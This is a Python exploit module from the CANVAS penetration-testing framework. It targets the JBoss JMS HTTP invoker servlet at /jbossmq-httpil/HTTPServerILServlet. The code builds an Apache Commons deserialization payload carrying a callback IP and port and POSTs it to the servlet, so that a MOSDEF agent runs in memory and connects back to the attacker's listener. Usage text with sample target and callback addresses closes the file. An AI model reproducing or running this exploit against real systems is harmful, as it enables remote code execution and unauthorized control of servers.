#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2018
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import os
import socket
import struct
import random
import time
import logging
import traceback

if '.' not in sys.path:
    sys.path.append('.')

import exploitutils
from tcpexploit import *
from canvasexploit import *
from libs.apache_commons_deserialize import objectcreator
from libs import spkproxy
from libs import yaml

module_path = os.path.dirname(os.path.realpath(__file__))

with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())


NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']
DOCUMENTATION = metadata['DOCUMENTATION']
PROPERTY      = metadata['PROPERTY']

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.host = ""
        self.port = 8080
        self.path_request = "/jbossmq-httpil/HTTPServerILServlet"
        self.ssl = False

        self.path = os.path.dirname(__file__)
        self.mosdef_type = "UNIVERSAL"
        self.target_url = ""

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.getarg("port")
        self.getarg("path_request")
        self.getarg("ssl")

        self.target_url = "https://" if self.ssl else "http://"
        self.target_url += "{}:{}/".format(self.host, self.port)
        return

    def setup_UA(self, url="", add_trail_slash=False):
        """
        Setup everything needed to do requests using spkproxy
        """
        if self.target_url:            
        	logging.info("Setting spkproxy.UserAgent with url: %s" % self.target_url)
        	ua  = spkproxy.UserAgent(self.target_url, hostname=self.host, exploit=self)
        	return ua

        return None

    def upload_and_run_mosdef(self):
    	#payload 
        payload = objectcreator(callback_ip=self.callback.ip,
                                    callback_port=self.callback.port,
                                    use_http=False, use_ssl=False).get_payload()
        logging.info('Payload created (%d bytes).' % len(payload))
        logging.info('Path request: %s' % self.path_request)
        return self.ua.POST(self.path_request, payload, noresponse=True) 


    def run(self):
        # Get arguments
        self.getargs()
        # Setting the spkproxy User-Agent
        self.ua = self.setup_UA()
        # Send and run mosdef.jar in memory
        self.upload_and_run_mosdef()
        return True


    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.100.142 -l 172.16.100.1 -d 5555")
        logging.info("-t <target ip>")
        logging.info("-p <target port> [optional]")
        logging.info("-O path_request: (default: /jbossmq-httpil/HTTPServerILServlet) [optional]")
        logging.info("-l call back ip for standard callback")
        logging.info("-d listening port for callback")
        return

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
